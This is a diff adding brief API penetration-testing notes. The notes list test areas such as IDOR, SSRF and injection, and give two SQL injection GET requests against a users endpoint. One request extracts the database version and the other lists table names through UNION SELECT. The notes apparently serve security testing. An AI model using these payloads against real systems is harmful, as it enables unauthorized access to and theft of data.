@@ -1,0 +1,18 @@
+
+
+
+
+
+API Penetrating Testing 
+
+Test Cases-
+	(Looking for abnormal HTTP headers, Authentication, IDOR, SSRF, XML Attacks, DOS, Injection Attacks)
+
+
++ Scan (active/passive) API first using BrupSuite
+
+-Injection
+		GET /v1/users.php?format=json&token=a'union+select+1,2,version(),4,5,--+ 
+		GET /v1/users.php?format=json&token=a'union+select+1,2,group_concat(table_name),4,5+from+information_schema.tables--
+		
+		
